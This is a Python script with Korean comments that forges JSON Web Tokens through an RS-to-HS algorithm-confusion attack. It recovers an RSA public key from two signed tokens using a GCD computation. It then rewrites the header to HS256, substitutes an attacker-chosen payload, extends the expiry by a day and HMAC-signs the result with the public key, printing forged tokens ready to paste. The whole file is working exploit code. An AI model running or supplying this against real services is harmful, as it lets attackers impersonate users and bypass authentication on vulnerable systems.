#1. 필요한 패키지 설치
import sys, json, base64
from gmpy2 import mpz, gcd, c_div
import binascii
from Crypto.Hash import SHA256, SHA384, SHA512
from Crypto.Signature import pkcs1_15
import asn1tools
import time
import hmac
import hashlib

HASH = ''
#2. Base64 URL 디코딩 및 인코딩 함수:
def b64urldecode(b64):
    return base64.urlsafe_b64decode(b64 + ("=" * (len(b64) % 4)))

def b64urlencode(m):
    return base64.urlsafe_b64encode(m).strip(b"=")

#3. Bytes to MPZ (Multiple Precision Integer) 변환 함수
# JWT의 서명 값을 GMP 라이브러리를 사용하여 다중 정밀도 정수로 변환
def bytes2mpz(b):
    return mpz(int(binascii.hexlify(b), 16))

#4. DER -> PEM
def der2pem(der, token="RSA PUBLIC KEY"):
    der_b64 = base64.b64encode(der).decode('ascii')
    lines = [der_b64[i:i+64] for i in range(0, len(der_b64), 64)]
    return "-----BEGIN %s-----\n%s\n-----END %s-----\n" % (token, "\n".join(lines), token)

# RS -> HS 알고리즘 변경하여 signing
# mpayload가 주어지면 해당 payload로 토큰 생성
def forge_mac(jwt0, public_key, mpayload=None):
    jwt0_parts = jwt0.encode('utf8').split(b'.')
    jwt0_msg = b'.'.join(jwt0_parts[0:2])

    alg = b64urldecode(jwt0_parts[0].decode('utf8'))
    alg_tampered = b64urlencode(alg.replace(b"RS256", b"HS256").replace(b"RS384", b"HS256").replace(b"RS512", b"HS256"))
    
    payload = json.loads(b64urldecode(jwt0_parts[1].decode('utf8')))
    if mpayload: 
        payload = mpayload
    payload['exp'] = int(time.time()) + 86400

    payload_encoded = b64urlencode(json.dumps(payload).encode('utf8'))
    tamper_hmac = b64urlencode(hmac.HMAC(public_key, b'.'.join([alg_tampered, payload_encoded]), hashlib.sha256).digest())

    jwt0_tampered = b'.'.join([alg_tampered, payload_encoded, tamper_hmac])
    print("[+] Tampered JWT: %s" % (jwt0_tampered))
    return jwt0_tampered

if __name__ == "__main__":

    # JWT 입력 및 서명 분석
    jwt0 = sys.argv[1]
    jwt1 = sys.argv[2]
    mpayload = json.loads(sys.argv[3])

    alg0 = json.loads(b64urldecode(jwt0.split('.')[0]))
    alg1 = json.loads(b64urldecode(jwt1.split('.')[0]))

    if not alg0["alg"].startswith("RS") or not alg1["alg"].startswith("RS"):
        raise Exception("Not RSA signed tokens!")
    if alg0["alg"] == "RS256":
        HASH = SHA256
    elif alg0["alg"] == "RS384":
        HASH = SHA384
    elif alg0["alg"] == "RS512":
        HASH = SHA512
    else:
        raise Exception("Invalid algorithm")

    jwt0_sig_bytes = b64urldecode(jwt0.split('.')[2])
    jwt1_sig_bytes = b64urldecode(jwt1.split('.')[2])
    if len(jwt0_sig_bytes) != len(jwt1_sig_bytes):
        raise Exception("Signature length mismatch")

    jwt0_sig = bytes2mpz(jwt0_sig_bytes)
    jwt1_sig = bytes2mpz(jwt1_sig_bytes)

    jks0_input = ".".join(jwt0.split('.')[0:2]) #token의 header, payload
    hash_0 = HASH.new(jks0_input.encode('ascii')) #hash(SHA256) 재생성
    padded0 = pkcs1_15._EMSA_PKCS1_V1_5_ENCODE(hash_0, len(jwt0_sig_bytes)) #서명 재생성?

    jks1_input = ".".join(jwt1.split('.')[0:2])
    hash_1 = HASH.new(jks1_input.encode('ascii'))
    padded1 = pkcs1_15._EMSA_PKCS1_V1_5_ENCODE(hash_1, len(jwt0_sig_bytes))

    m0 = bytes2mpz(padded0)
    m1 = bytes2mpz(padded1)

    #GCD (최대 공약수) 계산 및 공개 키 추출:
    pkcs1 = asn1tools.compile_files('pkcs1.asn', codec='der')
    x509 = asn1tools.compile_files('x509.asn', codec='der')

    jwts = []
    tjwts = [] # mpayload로 재생성한 토큰

    for e in [mpz(3), mpz(65537)]:
        gcd_res = gcd(pow(jwt0_sig, e) - m0, pow(jwt1_sig, e) - m1)
        print("[*] GCD: ", hex(gcd_res))
        for my_gcd in range(1, 100):
            my_n = c_div(gcd_res, mpz(my_gcd))
            if pow(jwt0_sig, e, my_n) == m0: # 해독한 값이 같다면,
                print("[+] Found n with multiplier", my_gcd, ":\n", hex(my_n))
                pkcs1_pubkey = pkcs1.encode("RSAPublicKey", {"modulus": int(my_n), "publicExponent": int(e)})
                x509_der = x509.encode("PublicKeyInfo", {"publicKeyAlgorithm": {"algorithm": "1.2.840.113549.1.1.1", "parameters": None}, "publicKey": (pkcs1_pubkey, len(pkcs1_pubkey) * 8)})
                pem_name = "pem-list/%s_%d_x509.pem" % (hex(my_n)[2:18], e)
                with open(pem_name, "wb") as pem_out:
                    public_key = der2pem(x509_der, token="PUBLIC KEY").encode('ascii')
                    pem_out.write(public_key)
                    print("[+] Written to %s" % (pem_name))
                    jwts.append(forge_mac(jwt0, public_key))
                    tjwts.append(forge_mac(jwt0, public_key, mpayload))
                pem_name = "pem-list/%s_%d_pkcs1.pem" % (hex(my_n)[2:18], e)
                with open(pem_name, "wb") as pem_out:
                    public_key = der2pem(pkcs1_pubkey).encode('ascii')
                    pem_out.write(public_key)
                    print("[+] Written to %s" % (pem_name))
                    jwts.append(forge_mac(jwt0, public_key))
                    tjwts.append(forge_mac(jwt0, public_key, mpayload))

    print("=" * 80)
    print("Here are your JWT's once again for your copypasting pleasure")
    print("=" * 80, '\n')
    print('jwts')
    for j in jwts:
        print(j.decode('utf-8'))
    print('tjwts')
    for j in tjwts:
        print(j.decode('utf-8'))
    
